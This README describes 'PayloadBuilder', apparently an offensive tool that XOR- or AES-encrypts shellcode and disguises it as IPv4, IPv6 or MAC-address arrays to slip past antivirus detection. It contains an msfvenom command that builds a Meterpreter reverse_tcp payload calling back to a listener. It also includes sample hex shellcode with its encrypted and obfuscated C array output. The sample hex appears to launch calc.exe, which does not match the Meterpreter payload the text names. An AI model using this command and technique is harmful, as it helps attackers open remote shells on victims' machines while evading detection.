# PayloadBuilder

This tool helps in encrypting and obfuscating payloads.
The tool takes a hex encoded payload, encrypt it in AES with a random key and IV and obfuscate it in one of the following options:

- IPv4
- IPv6
- MAC address
- UUID (coming soon)

The output will be in an array format. The key and IV will be printed so that they can be used for decryption.

For the example below, the following msfvenom payload is used:

`
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.178.145 LPORT=4444 -f hex
`

Example usage:

```


        8 8 8 8                     ,ooo.
         8a8 8a8                    oP   ?b
        d888a888zzzzzzzzzzzzzzzzzzzz8     8b
             `^'                    ?o___oP'

This program will encrypt and obfuscate the payload entered by the user.
The user can choose the encryption method and the obfucsation technique.


[#] Enter payload in hex:
fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831
c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd
9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500

[!] Encryption Methods Available
[i] 0 - None (skip encryption)
[i] 1 - XOR (Rolling Key)
[i] 2 - AES-256

[#] Select encrpytion method: 1
[i] Generating random XOR key ...

unsigned char XorKey[8] = {
        0x1C, 0x30, 0x71, 0x9D, 0x1E, 0x17, 0x6A, 0x02
};

[i] Encrypted input:
E0E3C4A882F8083FC5423F641A994347F831A4CC65EAB1BFF7584795F1D3C896588768DA863C632C6BAC57A0766584B2A6A15006662AFE08327D65624C3E05CD8622DE4CB18A207CCF36FEFCC30AD9566631DD9E4DAA06C217D9D4DF2A1B93C8BBC70B299FEC4705A1519B18FCD17572C3833403E58627
C1173D612208F62E29B4DBA22DAE83148B5D97D774BE81D9C2B5A921C791E2CC3C8C8C1413F24BCF1DE98F32B3426CB40A6137D24077E37CB8DB55E0B3B5CC065A8F04B9E1228F2FF11DA9571FB8A1C798E2657B253910C94EF6A14D4658B26FB8CE49941F70792A97CF904425B55C81612F7F786F72C8
F055878D6A66946280ED216CCB9BE022043F2FF908065269A9963F9D8B761A855218EB21D03E

[!] Obfuscation Method Available
[i] 0 - None (skip obfuscation)
[i] 1 - Ipv4
[i] 2 - Ipv6
[i] 3 - MAC Address
[i] 4 - UUID (COMING SOON?)

[#] Select obfuscation method: 3
[i] Payload size: 276 bytes
[i] Padded size: 276 bytes

char* MacArray [46] = {
        "E0-E3-C4-A8-82-F8","08-3F-C5-42-3F-64","1A-99-43-47-F8-31","A4-CC-65-EA-B1-BF","F7-58-47-95-F1-D3","C8-96-58-87-68-DA",
        "86-3C-63-2C-6B-AC","57-A0-76-65-84-B2","A6-A1-50-06-66-2A","FE-08-32-7D-65-62","4C-3E-05-CD-86-22","DE-4C-B1-8A-20-7C",
        "CF-36-FE-FC-C3-0A","D9-56-66-31-DD-9E","4D-AA-06-C2-17-D9","D4-DF-2A-1B-93-C8","BB-C7-0B-29-9F-EC","47-05-A1-51-9B-18",
        "FC-D1-75-72-C3-83","34-03-E5-86-27-C1","17-3D-61-22-08-F6","2E-29-B4-DB-A2-2D","AE-83-14-8B-5D-97","D7-74-BE-81-D9-C2",
        "B5-A9-21-C7-91-E2","CC-3C-8C-8C-14-13","F2-4B-CF-1D-E9-8F","32-B3-42-6C-B4-0A","61-37-D2-40-77-E3","7C-B8-DB-55-E0-B3",
        "B5-CC-06-5A-8F-04","B9-E1-22-8F-2F-F1","1D-A9-57-1F-B8-A1","C7-98-E2-65-7B-25","39-10-C9-4E-F6-A1","4D-46-58-B2-6F-B8",
        "CE-49-94-1F-70-79","2A-97-CF-90-44-25","B5-5C-81-61-2F-7F","78-6F-72-C8-F0-55","87-8D-6A-66-94-62","80-ED-21-6C-CB-9B",
        "E0-22-04-3F-2F-F9","08-06-52-69-A9-96","3F-9D-8B-76-1A-85","52-18-EB-21-D0-3E"
};


[#] Press <Enter> To Continue ...
```


